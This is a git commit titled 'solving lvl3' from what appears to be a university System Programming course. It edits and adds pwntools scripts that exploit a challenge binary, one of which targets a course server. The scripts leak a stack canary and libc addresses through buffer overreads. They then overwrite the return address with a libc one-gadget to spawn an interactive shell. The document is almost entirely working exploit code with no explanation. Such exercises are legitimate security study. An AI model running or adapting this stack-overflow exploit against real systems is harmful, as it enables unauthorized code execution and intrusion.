c95ba72cef5ee2e4d25fd97e17930ca87d268ac7
Brian <hibrian827@gmail.com>
2024-09-30 15:17:14 +0900

    solving lvl3

--- SNU_System_Programming/main.py
+++ SNU_System_Programming/main.py
@@ -3,7 +3,7 @@ from pwn import *
 # port = 10007
 # rem = remote("kayle.snu.ac.kr", port)
 rem = process("./level3/problem/level3")
-# gdb.attach(rem)
+gdb.attach(rem)
 
 elf = ELF("./level3/problem/level3")
 lib = ELF('./level3/problem/libc.so.6')
@@ -19,15 +19,14 @@ print(hex(canary))
 payload = b'B' * 0x68
 rem.send(payload)
 rem.recvuntil(payload)
-# lib_base = u64(rem.recvn(6) + b'\x00' * 2) + 48 - lib.symbols['__libc_start_main']
-# gadget_addr = lib_base + 0xebd38
-# print(hex(lib_base))
+# lib_base = u64(rem.recvn(6) + b'\x00' * 2) + 48 - lib.symbols['__libc_start_main'] # for 22.04
+lib_base = u64(rem.recvn(6) + b'\x00' * 2) - 243 - lib.symbols['__libc_start_main'] # for 20.04
+gadget_addr = lib_base + 0xebd38
+print(hex(lib_base))
 
-shellcode = shellcraft.execve("/bin/sh", 0 ,0)
-print(asm(shellcode))
-payload = b'C' * 0x28 + p64(canary) + b'C' * 0x8 + bytes(asm(shellcode))
+payload = b'C' * 0x28 + p64(canary) + b'C' * 0x8 + p64(gadget_addr)
 rem.recvuntil(b'comment: ')
 rem.send(payload)
 rem.recvline()
 
-# rem.interactive()
+rem.interactive()
---
+++ SNU_System_Programming/temp.py
@@ -0,0 +1,43 @@
+from pwn import *
+
+port = 10007
+rem = remote("kayle.snu.ac.kr", port)
+# rem = process("./level3/problem/level3")
+# gdb.attach(rem)
+
+elf = ELF("./level3/problem/level3")
+lib = ELF('./level3/problem/libc.so.6')
+
+rem.recvline()
+
+payload = b'A' * 0x49
+rem.send(payload)
+rem.recvuntil(payload)
+canary = u64(b'\x00' +rem.recvn(7))
+print(hex(canary))
+
+payload = b'B' * 0x58
+rem.send(payload)
+rem.recvuntil(payload)
+readName_addr = u64(rem.recvn(6) + b'\x00' * 2) - 34 - elf.symbols['main'] + elf.symbols['read_name'] # for 20.04
+print(hex(readName_addr))
+
+payload = b'C' * 0x28 + p64(canary) + b'C' * 0x8 + p64(readName_addr + 5)
+rem.recvuntil(b'comment: ')
+rem.send(payload)
+rem.recvline()
+
+payload = b'D' * 0x58
+rem.send(payload)
+rem.recvuntil(payload)
+# lib_base = u64(rem.recvn(6) + b'\x00' * 2) + 48 - lib.symbols['__libc_start_main'] # for 22.04
+print(hex(lib.symbols['__libc_start_main']))
+main243_addr = u64(rem.recvn(6) + b'\x00' * 2)
+print(hex(main243_addr))
+lib_base = main243_addr - 243 - lib.symbols['__libc_start_main'] # for 20.04
+gadget_addr = lib_base + 0xebd38
+print(hex(lib_base))
+
+# print(rem.recvn(3))
+
+# rem.interactive()
